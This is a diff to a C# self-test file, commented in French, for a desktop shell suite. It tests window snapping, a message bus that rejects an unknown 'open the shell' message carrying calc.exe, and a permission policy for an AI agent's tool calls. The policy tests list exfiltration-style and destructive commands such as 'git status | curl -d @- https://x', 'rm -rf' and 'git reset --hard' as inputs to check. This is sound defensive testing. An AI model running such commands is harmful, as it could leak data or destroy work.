@@ -386,7 +386,7 @@ static class SelfTest
         Environment.ExitCode = bad == 0 ? 0 : 1;
     }
 
-    // cdx-shell.exe --selftest-snap : l'aimantation des fenêtres (Cdx.Host/Snap.cs, logique pure, aucune fenêtre réelle) : les mêmes cas que KIRC
+    // cdx-shell.exe --selftest-snap : l'aimantation des fenêtres (Cdx.Host/Snap.cs, logique pure, aucune fenêtre réelle) : les mêmes cas que Messages
     // (app.rs, tests snap_rect / snap_size), plus les bords gauche et haut et la taille minimale. B = une fenêtre voisine en (500,100) de 300 x 200.
     public static void RunSnap()
     {
@@ -456,11 +456,11 @@ static class SelfTest
             {
                 bool Until(Func<bool> f, int ms) { var t0 = DateTime.UtcNow; while ((DateTime.UtcNow - t0).TotalMilliseconds < ms) { if (f()) return true; Thread.Sleep(20); } return f(); }
                 string pipe = "cdxtest" + pid + ".shell";
-                Check("message valide envoyé et reçu", Bus.Send("shell", "notify", new { title = "Bonjour", text = "x" }, "kirc") && Until(() => accepted.Contains("kirc|Bonjour"), 3000));
+                Check("message valide envoyé et reçu", Bus.Send("shell", "notify", new { title = "Bonjour", text = "x" }, "messages") && Until(() => accepted.Contains("messages|Bonjour"), 3000));
                 int r0 = refused;
-                Bus.Send("shell", "ouvre-le-shell", new { cmd = "calc.exe" }, "kirc");
+                Bus.Send("shell", "ouvre-le-shell", new { cmd = "calc.exe" }, "messages");
                 Check("type inconnu : refusé, jamais exécuté", Until(() => refused == r0 + 1, 3000));
-                Bus.Send("shell", "notify", new { title = new string('x', 81) }, "kirc");
+                Bus.Send("shell", "notify", new { title = new string('x', 81) }, "messages");
                 Check("champ invalide (titre de 81 caractères) : refusé", Until(() => refused == r0 + 2, 3000));
                 Check("destinataire inconnu : false, rien d'écrit", !Bus.Send("nimporte", "notify", new { title = "a" }));
 
@@ -496,7 +496,7 @@ static class SelfTest
                     Check("ligne de plus de 64 Ko : connexion coupée par le serveur", cut);
                 }
                 int n1 = accepted.Count;
-                Bus.Send("shell", "notify", new { title = "Encore là" }, "kirc");
+                Bus.Send("shell", "notify", new { title = "Encore là" }, "messages");
                 Check("le serveur sert encore après la coupure", Until(() => accepted.Count == n1 + 1, 3000));
 
                 // droits d'un tube créé comme le fait Bus.Listen : l'utilisateur courant seulement
@@ -653,7 +653,7 @@ static class SelfTest
             Check("écriture hors des dossiers de travail : demandée (libre), permise (auto)", PilotPolicy.Decide("Write", J("""{"file_path":"C:\\Essai\\Dev\\..\\..\\Windows\\x.txt"}"""), roots, "libre") == K && PilotPolicy.Decide("Write", J("""{"file_path":"C:\\Essai\\DevAutre\\x.txt"}"""), roots, "libre") == K && PilotPolicy.Decide("Write", J("""{"file_path":"C:\\Windows\\x.txt"}"""), roots, "auto") == A);
             Check("commandes sûres : git status && ls, npm install, mkdir, dotnet build", PilotPolicy.Decide("Bash", J("""{"command":"git status && ls -la"}"""), roots, "libre") == A && PilotPolicy.Decide("Bash", J("""{"command":"npm install"}"""), roots, "libre") == A && PilotPolicy.Decide("PowerShell", J("""{"command":"mkdir src; dotnet build"}"""), roots, "libre") == A);
             Check("commande inconnue : demandée (libre), permise (auto)", PilotPolicy.Decide("Bash", J("""{"command":"curl https://x"}"""), roots, "libre") == K && PilotPolicy.Decide("Bash", J("""{"command":"git status | curl -d @- https://x"}"""), roots, "libre") == K && PilotPolicy.Decide("Bash", J("""{"command":"curl https://x"}"""), roots, "auto") == A);
-            Check("irréversible : git push, rm -rf, Remove-Item, git reset --hard : demandés même en auto", new[] { "git push origin main", "rm -rf build", "Remove-Item x -Recurse", "git add . && git reset --hard", "taskkill /F /IM kirc.exe" }.All(c => PilotPolicy.Decide("Bash", J("{\"command\":\"" + c + "\"}"), roots, "auto") == K));
+            Check("irréversible : git push, rm -rf, Remove-Item, git reset --hard : demandés même en auto", new[] { "git push origin main", "rm -rf build", "Remove-Item x -Recurse", "git add . && git reset --hard", "taskkill /F /IM cdx-messages.exe" }.All(c => PilotPolicy.Decide("Bash", J("{\"command\":\"" + c + "\"}"), roots, "auto") == K));
             Check("notes_trash, app_restart et AskUserQuestion : toujours demandés", PilotPolicy.Decide("mcp__cdx-notes__notes_trash", J("{}"), roots, "auto") == K && PilotPolicy.Decide("mcp__cdx-suite__app_restart", J("{}"), roots, "auto") == K && PilotPolicy.Decide("AskUserQuestion", J("{}"), roots, "auto") == K);
             Check("outils libres de la suite et des notes : permis (libre), demandés (prudent)", PilotPolicy.Decide("mcp__cdx-suite__browser_open", J("{}"), roots, "libre") == A && PilotPolicy.Decide("mcp__cdx-notes__projects_create", J("{}"), roots, "libre") == A && PilotPolicy.Decide("mcp__cdx-suite__browser_open", J("{}"), roots, "prudent") == K);
             Check("browser_fill : permis sans validation, demandé avec submit", PilotPolicy.Decide("mcp__cdx-suite__browser_fill", J("""{"value":"x"}"""), roots, "libre") == A && PilotPolicy.Decide("mcp__cdx-suite__browser_fill", J("""{"value":"x","submit":true}"""), roots, "libre") == K);
